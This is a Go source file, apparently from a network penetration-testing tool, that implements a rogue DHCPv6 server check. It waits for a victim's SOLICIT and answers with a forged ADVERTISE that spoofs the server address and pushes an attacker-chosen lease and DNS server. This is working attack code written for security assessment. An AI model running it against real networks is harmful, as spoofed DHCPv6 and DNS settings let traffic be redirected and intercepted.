// roguedhcp6.go implements the rogue DHCPv6 server check. Impact
// temporary, restore decay with a 600 s bound, affects clients: the
// ADVERTISE answers the victim's SOLICIT with a lease whose valid lifetime
// is 600 s, so a client that takes it drops the address when that
// lifetime runs out, and nothing is restored by the run.

package ip6

import (
	"bytes"
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"
	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

type rogueDHCPv6Finding struct {
	Action        string `json:"action"`
	TransactionID string `json:"transaction_id"`
	LeaseAddress  string `json:"lease_address"`
	PreferredLife uint32 `json:"preferred_lifetime"`
	ValidLife     uint32 `json:"valid_lifetime"`
	DecayNote     string `json:"decay_note"`
}

// solicitFrom returns the DHCPv6 SOLICIT in data when its Ethernet source
// is client and it carries a client identifier, with the host it came
// from: that Ethernet source and the IPv6 source. A frame that does not
// decode to that is nil.
func solicitFrom(data []byte, client net.HardwareAddr) (*layers.DHCPv6, check.Host) {
	if len(data) < 14 || !bytes.Equal(data[6:12], client) {
		return nil, check.Host{}
	}
	pkt := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.Default)
	eth, ok := pkt.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
	if !ok {
		return nil, check.Host{}
	}
	ip, ok := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
	if !ok {
		return nil, check.Host{}
	}
	dhcp, ok := pkt.Layer(layers.LayerTypeDHCPv6).(*layers.DHCPv6)
	if !ok || dhcp.MsgType != layers.DHCPv6MsgTypeSolicit {
		return nil, check.Host{}
	}
	for _, opt := range dhcp.Options {
		if opt.Code == layers.DHCPv6OptClientID && len(opt.Data) > 0 {
			return dhcp, check.Host{IP: ip.SrcIP, MAC: eth.SrcMAC}
		}
	}
	return nil, check.Host{}
}

// RunRogueDHCPv6 waits for the window for a SOLICIT from the target's IPv6
// victim MAC on the attack leg and answers it with an ADVERTISE to the
// host the SOLICIT came from, from the target's IPv6 server address,
// which is also the DNS server it offers. The leased address, the
// lifetimes, and the IAID are probe content. The verdict is pending: when
// the window ends without a SOLICIT nothing was sent, and after the
// ADVERTISE whether the client took the lease needs a REQUEST listener it
// does not have. Cancellation while waiting returns ctx.Err(). A terminal
// receive error comes back wrapped.
func RunRogueDHCPv6(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVictim6, check.FieldVictim6MAC, check.FieldServer6); err != nil {
		return check.Verdict{}, err
	}
	src := deps.AttackLeg.Addr().MAC
	client := deps.Target.Victim6.MAC

	frame, _, err := check.First(ctx, deps.AttackLeg, deps.Observe, func(data []byte) bool {
		solicit, _ := solicitFrom(data, client)
		return solicit != nil
	})
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "roguedhcp6: receive solicit")
	}
	if frame == nil {
		return check.Pending(fmt.Sprintf("no solicit in %v", deps.Observe)), nil
	}
	solicit, from := solicitFrom(frame, client)

	var clientDUID []byte
	for _, opt := range solicit.Options {
		if opt.Code == layers.DHCPv6OptClientID {
			clientDUID = opt.Data
			break
		}
	}

	advertise, err := craftDHCPv6Advertise(src, deps.Target.Server6.IP, from, solicit.TransactionID, clientDUID)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "roguedhcp6: craft advertise")
	}
	if err := deps.AttackLeg.Send(ctx, advertise); err != nil {
		return check.Verdict{}, errs.Wrap(err, "roguedhcp6: send advertise")
	}

	leaseAddr := net.ParseIP("fd00::200")
	detail, _ := json.Marshal(rogueDHCPv6Finding{
		Action:        "rogue-dhcpv6-server",
		TransactionID: fmt.Sprintf("%x", solicit.TransactionID),
		LeaseAddress:  leaseAddr.String(),
		PreferredLife: 300,
		ValidLife:     600,
		DecayNote:     "600s valid lifetime announced",
	})
	deps.Emitter.Finding("dhcpv6", detail)

	return check.Pending("no observable: lease acceptance needs a REQUEST listener"), nil
}

// craftDHCPv6Advertise builds a DHCPv6 ADVERTISE from the rogue server.
func craftDHCPv6Advertise(src net.HardwareAddr, serverIP net.IP, client check.Host, xid []byte, clientDUID []byte) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       client.MAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv6,
	}
	ip := &layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolUDP,
		HopLimit:   255,
		SrcIP:      serverIP,
		DstIP:      client.IP,
	}
	udp := &layers.UDP{
		SrcPort: 547,
		DstPort: 546,
	}
	_ = udp.SetNetworkLayerForChecksum(ip)

	// Server DUID (LL type): type=1(LL), hwtype=1(eth), MAC.
	serverDUID := append([]byte{0x00, 0x01, 0x00, 0x01}, src...)

	// IA_NA with IAAddr: IAID(4)+T1(4)+T2(4) + IAAddr option(4+16+4+4)
	iaNAWithAddr := make([]byte, 12+4+16+4+4)
	binary.BigEndian.PutUint32(iaNAWithAddr[0:4], 0x00000001) // IAID
	binary.BigEndian.PutUint32(iaNAWithAddr[4:8], 300)        // T1
	binary.BigEndian.PutUint32(iaNAWithAddr[8:12], 600)       // T2
	// IAAddr option embedded: code(2)+len(2)+addr(16)+pref(4)+valid(4)
	binary.BigEndian.PutUint16(iaNAWithAddr[12:14], uint16(layers.DHCPv6OptIAAddr))
	binary.BigEndian.PutUint16(iaNAWithAddr[14:16], 24) // option data length
	copy(iaNAWithAddr[16:32], net.ParseIP("fd00::200").To16())
	binary.BigEndian.PutUint32(iaNAWithAddr[32:36], 300) // preferred
	binary.BigEndian.PutUint32(iaNAWithAddr[36:40], 600) // valid

	statusData := []byte{0x00, 0x00} // Success

	dhcp := &layers.DHCPv6{
		MsgType:       layers.DHCPv6MsgTypeAdvertise,
		TransactionID: xid,
		Options: layers.DHCPv6Options{
			layers.NewDHCPv6Option(layers.DHCPv6OptServerID, serverDUID),
			layers.NewDHCPv6Option(layers.DHCPv6OptClientID, clientDUID),
			layers.NewDHCPv6Option(layers.DHCPv6OptIANA, iaNAWithAddr),
			layers.NewDHCPv6Option(layers.DHCPv6OptStatusCode, statusData),
			layers.NewDHCPv6Option(layers.DHCPv6OptDNSServers, serverIP.To16()),
		},
	}
	return craft.Default(eth, ip, udp, dhcp)
}

var _ gopacket.SerializableLayer = (*layers.DHCPv6)(nil)
